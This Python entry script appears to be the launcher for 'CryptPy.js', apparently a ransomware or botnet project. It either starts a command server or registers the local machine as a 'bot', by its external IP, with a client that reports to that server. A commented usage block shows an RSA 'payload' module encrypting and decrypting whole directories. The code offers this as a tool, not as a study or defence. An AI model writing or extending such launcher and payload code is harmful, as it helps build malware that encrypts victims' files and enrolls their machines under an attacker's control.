from networking import server # Import server
import argparse
import ipgetter
from common.commondefs import true
from common.commondefs import none
from networking import server
from networking import client
from bot import bot

#from payload.rsa.rsa import RSA
"""
# SYNTAX FOR RSA MODULE
# Setup
key_name = "3b4e434"
payload = RSA(key_name)
# To encrypt a dir:
payload.encrypt("payload/rsa/test_files") # Dont put a slash at the end of the path
# To decrypt a dir:
payload.decrypt("payload/rsa/test_files")
"""

def main():
    parser = argparse.ArgumentParser(description='start CryptPy.js') # Init parser

    parser.add_argument('--server', action='store_true', help='Starts CryptPy.js in server mode') # Add server argument
    parser.add_argument('--terminal', action='store_true', help='Starts server in terminal mode') # Add terminal argument

    args = parser.parse_args() # Fetch arguments

    if args.server == true:
        if args.terminal == true:
            server.Server("terminal") # Init server
        else:
            server.Server("") # Init server
    else:
        self_bot = bot.Bot

        self_bot = bot.Bot ( # Init bot
            ipgetter.myip() # Get external IP
        )

        client.Client(self_bot) # Init and register client

        self_bot.rest() # Start rest server

    # TODO: fix db serialization

main()